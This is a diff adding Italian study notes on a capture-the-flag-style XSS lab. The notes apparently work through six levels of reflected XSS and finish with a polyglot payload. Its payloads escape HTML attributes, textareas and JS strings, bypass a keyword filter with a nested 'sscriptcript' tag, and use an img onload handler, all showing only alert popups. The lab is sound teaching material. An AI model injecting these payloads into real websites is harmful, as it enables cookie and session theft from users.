@@ -1,0 +1,111 @@
+Il payload è lo JavaScript che vogliamo venga eseguito su un bersaglio o sul browser di un altro utente. 
+Un payload per un attacco XSS potrebbe avere molte intenzioni, dal mostrare un popup di allerta, al catturare informazioni, contenuti, cookie e token di sessione ecc.
+Creare il payload ideale è chiave nell'attacco XSS.
+#
+E' importante comprendere come un payload JavaScript verrà riflesso nel codice del website bersaglio
+per poter creare il payload perfetto per quel caso.
+##
+ESEMPIO PRATICO-LIVELLO #1
+L'obiettivo è di attaccare il sito web https://10-10-142-216.p.thmlabs.com/
+con un XSS, del quale payload
+<script>alert('THM');</script>
+per creare una funzione di avviso con la stringa "THM"
+#
+Nella forma della pagina viene chiesto di inserire il nome 
+
+
+    <div class="text-center">
+        <h2>Hello, nuxil</h2>
+    </div>
+
+questo è il pezzo di codice interessante, significa che qui posso inserire un codice che verrà 
+integrato con il codice stesso della pagina, effettivamente attivando il payload.
+Proviamolo.
+Infatti ottengo un popup di avviso, con scritto THM (la stringa inserita);
+L'XSS ha avuto successo.
+##
+LIVELLO #2
+
+ <div class="text-center">
+        <h2>Hello, <input value="nuxil"></h2>
+    </div>
+
+Qui, invece, viene inserito come un valore input. Questo richiede una modifica, seppur minima, al payload.
+
+"><script>alert('THM');</script>
+
+"> è la parte importante del payload perchè chiude l'input, e chiude il valore - andando ad inserire comunque il payload.
+##
+LIVELLO #3
+Qui succede la stessa cosa di prima, ma questa volta il nome/payload verrà riflesso in un tag HTML, un tag textarea.
+
+</textarea><script>alert('THM');</script>
+
+Stessa idea di prima, chiudiamo l'input del textarea e verrà inserito lo script.
+
+<div class="text-center">
+        <h2>Hello, <textarea></textarea><script>alert('THM');</script></textarea></h2>
+    </div>
+##
+LIVELLO #4
+Questa volta il nome viene mostrato come nel livello uno, ma con una differenza: questa volta
+viene riflesso in un codice JavaScript.
+
+    <script>
+        document.getElementsByClassName('name')[0].innerHTML='nuxil';
+    </script>
+
+per aggirarlo questa volta dobbiamo scappare dal comando JavaScript. Come fare:
+
+';alert('THM');//
+
+Dove ' chiude il campo che specifica il nome
+; chiude il comando
+// rendono tutto ciò che c'è dopo un commento
+
+    <script>
+        document.getElementsByClassName('name')[0].innerHTML='';alert('THM');//';
+    </script>
+##
+LIVELLO #5
+
+<div class="text-center">
+        <h2>Hello, nuxil</h2>
+    </div>
+
+Sembra identico al primo livello. Ma qualcosa non va:
+
+<div class="text-center">
+        <h2>Hello, <>alert('THM');</></h2>
+    </div>
+
+Come vedi, c'è un filtro che rimuove parole pericolose come in questo caso 'script'.
+C'è un trucchetto ovviamente per aggirare la cosa:
+
+<sscriptcript>alert('THM');</sscriptcript>
+
+Così facendo, la parola script verrà rimossa ma nel payload finale ci sarà comunque: 
+<script>alert('THM');</script>
+##
+LIVELLO #6
+
+ <div class="text-center">
+        <h2>Your Picture</h2>
+        <img src="scriptalert('THM');/script">
+    </div>
+
+Inquesto livello non funziona perchè non possiamo scappare dall'input dell'immagine, perchè <> sono filtrati. Ecco un payload che ci aiuterà in questo caso:
+
+/images/cat.jpg" onload="alert('THM');
+
+perchè questo?
+abbiamo selezionato una foto e il parametro 'onload' attiva il codice quando verrà caricata
+l'immagine.
+##
+	XSS POLIGLOTTA
+E' un tipo di stringa payload che riesce a scappare a diversi filtri, attributi, tags, etc.
+Eccone un esempio:
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+##
